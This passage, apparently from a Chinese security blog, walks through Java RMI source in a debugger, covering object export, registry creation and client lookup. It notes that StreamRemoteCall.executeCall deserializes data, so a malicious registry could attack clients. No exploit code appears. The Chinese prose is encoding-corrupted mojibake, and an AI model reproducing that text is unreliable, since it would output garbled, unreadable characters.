å®ä¾‹ä¹Ÿå¯ä»¥è°ƒç”¨<ul><li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png"></li></ul></li><li>Remote objï¼šå®ç°äº† java.rmi.Remote æ¥å£çš„å¯¹è±¡ï¼Œ</li><li>int portï¼š æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png"></p><p>æ¥ä¸‹è¿›å…¥ return exportObject(obj, new UnicastServerRef(port)); ä¸­çš„  <font style="color:#080808;background-color:#ffffff;">new UnicastServerRef(port))ï¼Œ</font><strong><font style="color:#080808;background-color:#ffffff;">UnicastServerRef</font></strong><font style="color:#080808;background-color:#ffffff;">ï¼ˆç§°ä¹‹ä¸ºæœåŠ¡ç«¯å¼•ç”¨ï¼‰</font></p><p><font style="color:#080808;background-color:#ffffff;">var 1 è¿™é‡Œæ˜¯ç«¯å£å· port ï¼Œä¼ å…¥ port åï¼Œè°ƒç”¨ çˆ¶ç±»æ„é€ å‡½æ•° </font><strong><font style="color:#080808;background-color:#ffffff;">LiveRef</font></strong><font style="color:#080808;background-color:#ffffff;">,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png"></p><p>æ¥åˆ° LiveRef çš„æ„é€ å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹ getLocalEndpoint</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png"></p><p>è¿™é‡Œçš„ <strong>TCPEndpoint</strong> ç”¨äºè¿œç¨‹é€šä¿¡ï¼Œå…¶æ„é€ å‡½æ•°ä¸­çš„å˜é‡ String var1 ä¸º host (ip) ã€int var2 ä¸º port (ç«¯å£)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png"></p><p>ç»§ç»­è·Ÿå…¥ <font style="color:#080808;background-color:#ffffff;">this(var1, TCPEndpoint.getLocalEndpoint(var2), true); ä¸­çš„ </font>thisï¼Œåœ¨æ­¤å¤„ ep ä¸­æœ‰äº†IPå’Œç«¯å£ä¿¡æ¯</p><ul><li>Endpoint ep    ç«¯ç‚¹ä¿¡æ¯ï¼ˆIPã€ç«¯å£ã€socketï¼‰</li><li>Channel ch     é€šä¿¡é€šé“ï¼ˆç¼“å­˜çš„è¿æ¥ï¼‰</li><li>isLoacl    æ˜¯å¦ä¸ºæœ¬åœ°å¯¹è±¡</li></ul><p>ç„¶åè¿™äº›ä¿¡æ¯éƒ½è¢«å­˜æ”¾åœ¨ LiveRef ä¸­ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png"></p><p>æ¥ä¸‹æ¥åˆè°ƒç”¨äº†çˆ¶ç±»æ–¹æ³•å¹¶å°† ref èµ‹å€¼ä¸º var1ï¼ˆvar1:<strong>LiveRef@626</strong>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png"></p><p>æ¥ä¸‹æ¥å›åˆ°  <font style="color:#080808;background-color:#ffffff;">return exportObject(obj, new UnicastServerRef(port)); ä¸­çš„  exportObject æ–¹æ³•</font></p><p><font style="color:#080808;background-color:#ffffff;">é¦–å…ˆåˆ¤æ–­äº† obj æ˜¯å¦ç»§æ‰¿äº† UnicastRemoteObject ï¼Œå¦‚æœæ²¡æœ‰ç»§æ‰¿é‚£ä¹ˆå°±æŠŠ ref è®¾ç½®ä¸º srefã€‚</font></p><p><font style="color:#080808;background-color:#ffffff;">ä¹‹åéƒ½ä½¿ç”¨ sref.exportObject è¿›è¡Œå·¥ä½œå®Œæˆå¯¼å‡ºè¿œç¨‹å¯¹è±¡çš„æ“ä½œ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png"></p><p>è€Œ sref ä¸­å°è£…ç€ LiveRef@626</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p><strong><font style="color:#080808;background-color:#ffffff;">sref.exportObject </font></strong> çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>è¿™ä¸€æ­¥æ˜¯åˆ›å»º<strong>å®¢æˆ·ç«¯ä»£ç†</strong>çš„è¿‡ç¨‹ã€‚</p><blockquote><p>ï¼ˆä¸ºä»€ä¹ˆè¦åœ¨æœåŠ¡ç«¯åˆ›å»ºå®¢æˆ·ç«¯ä»£ç†å‘¢ï¼Ÿï¼‰</p><p>è¿™é‡Œé€šè¿‡æµç¨‹å›¾è§£é‡Šï¼šæœåŠ¡ç«¯é¦–å…ˆåˆ›å»ºå¥½ Remote Stub æ”¾åˆ°æ³¨å†Œä¸­å¿ƒï¼Œå®¢æˆ·ç«¯é€šè¿‡æ³¨å†Œä¸­å¿ƒæ‹¿åˆ° Remote Stubï¼Œå®¢æˆ·ç«¯é€šè¿‡ Remote Stub è°ƒç”¨å¦ä¸€ä¸ªä»£ç† Remote Skeleton ï¼Œä¹‹å Remote Skeleton è°ƒç”¨æœåŠ¡ç«¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png"></p></blockquote><p>æ­¥å…¥ createProxy</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png"></p><p>clientRef ä¸­å­˜æ”¾çš„å°±æ˜¯é‚£ä¸ªæ ¸å¿ƒ LiveRef@783 ï¼ˆä¸Šæ–‡æ˜¯ LiveRef@626ï¼Œæ ¸å¿ƒéƒ½æ˜¯ç›¸åŒçš„ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png"></p><p>æ­¤å¤„è¿›è¡Œäº†åˆ¤æ–­ï¼š</p><ul><li>forceStubUseï¼šå¦‚æœä¸º <code>true</code>ï¼Œå°±å¼ºåˆ¶ä½¿ç”¨æ—§çš„ <strong>é™æ€ Stub ç±»</strong>ï¼ˆç”± <code>rmic</code> å·¥å…·ç”Ÿæˆçš„ <code>_Stub.class</code>ï¼‰è¿™æ˜¯ä¸ºäº†å…¼å®¹ JDK 1.1 æ—¶ä»£çš„ RMIï¼Œè¿™ç§æƒ…å†µç›´æ¥è°ƒç”¨ <code>createStub(...)</code> å»åŠ è½½å’Œå®ä¾‹åŒ– Stub</li><li>ignoreStubClassesï¼šå¦‚æœä¸º <code>true</code>ï¼Œè¡¨ç¤ºå¿½ç•¥é™æ€ Stub ç±»ã€‚è¿™æ—¶ä¼šå°è¯•ç”¨ <strong>åŠ¨æ€ä»£ç†</strong>ï¼ˆ<code>java.lang.reflect.Proxy</code>ï¼‰æ¥ç”Ÿæˆ Stub</li><li>stubClassExistsï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>    <span class="hljs-comment">//å…ˆçœ‹ç¼“å­˜ï¼šwithoutStubs ç”¨æ¥å­˜æ”¾ â€œå·²ç»ç¡®å®šæ²¡æœ‰ Stub çš„ç±»â€</span><br>    <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//å°è¯•ç”¨ Class.forName åŠ è½½ [è¿œç¨‹ç±»å + &quot;_Stub&quot;] è¿™ä¸ªç±»</span><br>            Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                          <span class="hljs-literal">false</span>,<br>                          remoteClass.getClassLoader());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//å¦‚æœèƒ½åŠ è½½æˆåŠŸï¼Œè¯´æ˜ç¡®å®å­˜åœ¨ Stub ç±»</span><br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            <span class="hljs-comment">// å¦‚æœåŠ è½½ä¸åˆ°ï¼Œè¯´æ˜è¿™ä¸ªè¿œç¨‹ç±»æ²¡æœ‰å¯¹åº”çš„ &quot;_Stub&quot;</span><br>            <span class="hljs-comment">//  é‚£ä¹ˆå°±æŠŠå®ƒè®°åˆ° withoutStubs ç¼“å­˜é‡Œï¼Œä¸‹æ¬¡æŸ¥è¯¢å°±ç›´æ¥è¿”å› false</span><br>            withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//å¦‚æœç¼“å­˜é‡Œå·²æœ‰ï¼Œæˆ–è€…åŠ è½½å¤±è´¥ï¼Œå°±è¿”å› false</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¦‚æœè¦è¿›å…¥ createStub ï¼Œ<strong>å¼ºåˆ¶ä½¿ç”¨ Stub</strong><code>forceStubUse == true</code>ï¼Œ<strong>æ²¡æœ‰å¿½ç•¥ Stub å¹¶ä¸”å­˜åœ¨ Stub ç±»</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png"></p><p>ä¸‹ä¸€æ­¥åˆ›å»ºåŠ¨æ€ä»£ç†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png"></p><p>å…¶ä¸­çš„ handler å­˜æ”¾ LiveRef@783</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png"></p><p>è¿™æ ·å°±åˆ›å»ºå¥½äº†åŠ¨æ€ä»£ç† <strong>stub</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png"></p><p>è¿›å…¥ Target ï¼ˆå®é™…ä¸Šæ˜¯å°†ç›®å‰åˆ›å»ºçš„ä¸œè¥¿éƒ½å°è£…åˆ°ä¸€èµ·ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png"></p><p><strong>å®¢æˆ·ç«¯å¼•ç”¨ï¼ˆstubï¼‰å’ŒæœåŠ¡ç«¯å¼•ç”¨ï¼ˆdispï¼‰çš„ LiveRef æ˜¯ä¸€æ ·çš„ï¼Œ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png"></p><p>æ¥ä¸‹æ¥ï¼Œå°†å°è£…å¥½çš„ target å‘å¸ƒå‡ºå»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png"></p><p>è·Ÿåˆ°äº† TCPTransport ç±»ä¸­çš„ exportObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png"></p><p>listen() å‡½æ•°å…ˆè·å– <strong>TCPEndpoint@823</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png"></p><p>å‡†å¤‡åˆ›å»º ServerSocket</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png"></p><p>åˆ¤æ–­ port æ˜¯å¦ä¸º 0ï¼Œå¦‚æœä¸º 0 ï¼Œè¿›å…¥ setDefaultPortï¼Œè®¾ç½®ç«¯å£å·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (listenPort == <span class="hljs-number">0</span>)<br>    setDefaultPort(server.getLocalPort(), csf, ssf);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png"></p><p>è¿›å…¥ server.getLocalPort </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png"></p><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ç«¯å£è¢«èµ‹å€¼ï¼Œæ­¤ç«¯å£éšæœºï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png"></p><p>è¿™ä¸ªæ—¶å€™çš„ç«¯å£è¢«èµ‹å€¼ä¸º 55685</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png"></p><ul><li>doPrivilegedï¼š è¡¨ç¤ºå³ä½¿è°ƒç”¨æ ˆä¸Šå…¶ä»–ä»£ç æ²¡æœ‰æƒé™ï¼Œä¹Ÿå…è®¸è¿™é‡Œçš„æ“ä½œæŒ‰æœ¬æ–¹æ³•çš„æƒé™æ‰§è¡Œã€‚ </li><li>NewThreadActionï¼š åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹</li></ul><p>è¿™ä¸ªçº¿ç¨‹å¼€å¯ä¹‹åç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png"></p><p>åšå®Œè¿™äº›ä¹‹åï¼Œç”¨ MAP è¡¨å‚¨å­˜ targetï¼Œtarget ä¸­åŒ…æ‹¬äº† IPã€ç«¯å£ã€æœåŠ¡ç«¯ä»£ç†ã€å®¢æˆ·ç«¯ä»£ç†ç­‰ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png"></p><p>æœ€åè¿”å›ä¸€äº›å€¼ï¼Œå®Œæˆäº†æœåŠ¡ç«¯çš„å‘å¸ƒè¿‡ç¨‹ã€‚</p><p>åˆ°è¿™é‡Œåœ¨è¿”å›çœ‹ <strong>exportObject å‡½æ•°çš„ä½œç”¨</strong>ï¼š</p><ul><li>é™æ€æ–¹æ³•çš„ <font style="color:#080808;background-color:#ffffff;">exportObject ä¼ å…¥ä¿©ä¸ªå‚æ•°ï¼Œåˆ›å»ºä¸€ä¸ª UnicastServerRef å¯¹è±¡ sref ï¼Œsref ä¸­å°è£…äº†IPã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæ ¸å¿ƒæ˜¯ LiveRef@xxxï¼Œç„¶åè°ƒç”¨ exportObject(obj, sref)</font></li><li><font style="color:#080808;background-color:#ffffff;">é‡è½½æ–¹æ³•çš„ exportObject è¿”å›ä»£ç†å¯¹è±¡ stub</font></li><li>è¿™æ ·å°±åšåˆ°äº†æŠŠä¸€ä¸ªæœ¬åœ°çš„è¿œç¨‹å¯¹è±¡å®ä¾‹å¯¼å‡ºæˆä¸€ä¸ªå¯ä»¥è¿œç¨‹è®¿é—®çš„å¯¹è±¡</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png"></p><h3 id="3-2-æ³¨å†Œä¸­å¿ƒ-åˆ›å»ºæ³¨å†Œä¸­å¿ƒ-ç»‘å®š"><a href="#3-2-æ³¨å†Œä¸­å¿ƒ-åˆ›å»ºæ³¨å†Œä¸­å¿ƒ-ç»‘å®š" class="headerlink" title="3.2 æ³¨å†Œä¸­å¿ƒ-åˆ›å»ºæ³¨å†Œä¸­å¿ƒ+ç»‘å®š"></a>3.2 æ³¨å†Œä¸­å¿ƒ-åˆ›å»ºæ³¨å†Œä¸­å¿ƒ+ç»‘å®š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png"></p><p>è°ƒç”¨ createRegistry  åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œé»˜è®¤ç«¯å£å·ä¸º1099</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png"></p><p>åˆ°äº†è¿™ä¸€æ­¥ç‚¹â€œæ¢å¤ç¨‹åºâ€ï¼Œå¦‚æœç»§ç»­è·Ÿè¿›å»ä¼šå‘ç°ä¸€å †å¥‡æ€ªçš„ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png"></p><p>æ¥åˆ°è¿™ä¸€æ­¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png"></p><p>åˆ›å»ºäº†ä¸€ä¸ª LiveRefï¼Œä¸€ä¸ª lrefï¼Œï¼ˆè¿™é‡Œçš„ä½œç”¨å’ŒæœåŠ¡ç«¯çš„å®é™…ä¸Šæ˜¯ä¸€æ ·çš„ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png"></p><h3 id="3-3-å®¢æˆ·ç«¯-è¯·æ±‚æ³¨å†Œä¸­å¿ƒ"><a href="#3-3-å®¢æˆ·ç«¯-è¯·æ±‚æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="3.3 å®¢æˆ·ç«¯-è¯·æ±‚æ³¨å†Œä¸­å¿ƒ"></a>3.3 å®¢æˆ·ç«¯-è¯·æ±‚æ³¨å†Œä¸­å¿ƒ</h3><p>é¦–å…ˆè¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œæ¥æ”¶ä¼ å…¥çš„IPå’Œç«¯å£</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png"></p><p>ä½¿ç”¨LIveRef ï¼Œå°†ä¼ å…¥çš„ host,port,ç­‰å°è£…</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png"></p><p>å†æ¬¡è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">createProxy æ–¹æ³•ï¼ŒåŒæ ·çš„åˆ›å»ºäº† stub ï¼Œï¼ˆè¿™é‡Œçš„åˆ›å»ºæ˜¯é€šè¿‡æ³¨å†Œä¸­å¿ƒä¼ å…¥å‚æ•°ï¼ˆhost,port..ï¼‰ï¼Œå®¢æˆ·ç«¯è‡ªè¡Œåˆ›å»º stubï¼‰</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png"></p><p>æ¥åˆ°ä¸‹ä¸€æ­¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png"></p><h4 id="é—®é¢˜ï¼šåœ¨åŠ¨æ€è°ƒè¯•æ—¶é‡åˆ°æŠ¥é”™ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¼€å¯ï¼"><a href="#é—®é¢˜ï¼šåœ¨åŠ¨æ€è°ƒè¯•æ—¶é‡åˆ°æŠ¥é”™ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¼€å¯ï¼" class="headerlink" title="é—®é¢˜ï¼šåœ¨åŠ¨æ€è°ƒè¯•æ—¶é‡åˆ°æŠ¥é”™ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¼€å¯ï¼"></a>é—®é¢˜ï¼šåœ¨åŠ¨æ€è°ƒè¯•æ—¶é‡åˆ°æŠ¥é”™ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯æ²¡æœ‰å¼€å¯ï¼</h4><p>ä¸‹ä¸€æ­¥è°ƒç”¨ä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œå› ä¸ºæœåŠ¡ç«¯æ²¡æœ‰å¼€å¯ç›‘å¬</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png"></p><p>å°† RMIServer è¿è¡Œèµ·æ¥å°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png"></p><p>è¿™é‡Œçœ‹åˆ°ä¼ è¿›æ¥çš„ var1 å®é™…ä¸Šå°±æ˜¯<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>ä¸­çš„ <code>remoteObj</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//åˆ›å»ºè¿œç¨‹è°ƒç”¨å¯¹è±¡</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//åºåˆ—åŒ–å‚æ•°ï¼Œå°† var1 å†™å…¥è¾“å‡ºæµ</span><br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>            var3.writeObject(var1);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>        &#125;<br><br>        <span class="hljs-comment">//å‘èµ·è¿œç¨‹è°ƒç”¨ï¼Œ</span><br>        <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>        Remote var23;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">///ä»è¾“å…¥æµä¸­è¯»å–è¿œç¨‹ registry è¿”å›çš„å¯¹è±¡</span><br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>            <span class="hljs-comment">//</span><br>            var23 = (Remote)var6.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var2);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var23;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>        <span class="hljs-keyword">throw</span> var19;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>        <span class="hljs-keyword">throw</span> var20;<br>    &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› <strong>invoke</strong></p><p><strong>super.ref.invoke(var2);</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png"></p><p>StreamRemoteCall ç±»ä¸­çš„ executeCall æ˜¯çœŸæ­£å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ–¹æ³•</p><p><strong>executeCall ä¸­æœ‰ä¸€æ­¥é€šè¿‡ååºåˆ—åŒ–å¤„ç†å¼‚å¸¸ï¼Œå¦‚æœæ³¨å†Œä¸­å¿ƒæœ‰æ¶æ„å¯¹è±¡ï¼Œå®¢æˆ·ç«¯åœ¨æ­¤å¤„ååºåˆ—åŒ–æ—¶è¢«æ”»å‡»ã€‚</strong></p><p><strong>ç”±äº executeCall æ˜¯å®¢æˆ·ç«¯ç½‘ç»œè¯·æ±‚çš„å¿…ç»ä¹‹è·¯ï¼Œæ‰€ä»¥è¿™ä¸ªååºåˆ—åŒ–å‡ ä¹ä¸å¯é¿å…</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png"></p><p>è¿™é‡Œçš„ lookup æ–¹æ³•çš„ä½œç”¨å°±æ˜¯å»æ³¨å†Œä¸­å¿ƒæŸ¥æ‰¾è¿œç¨‹å¯¹è±¡</p><h3 id="3-4-å®¢æˆ·ç«¯-è¯·æ±‚æœåŠ¡ç«¯"><a href="#3-4-å®¢æˆ·ç«¯-è¯·æ±‚æœåŠ¡ç«¯" class="headerlink" title="3.4 å®¢æˆ·ç«¯-è¯·æ±‚æœåŠ¡ç«¯"></a>3.4 å®¢æˆ·ç«¯-è¯·æ±‚æœåŠ¡ç«¯</h3><p><strong>åŒæ ·æ³¨æ„å¼€å¯æœåŠ¡ç«¯</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png"></p><p>æ¥åˆ°äº† invoke</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png"></p><p>è¿™é‡Œåˆè·Ÿåˆ°äº† StreamRemoteCall ï¼Œè¿™æ 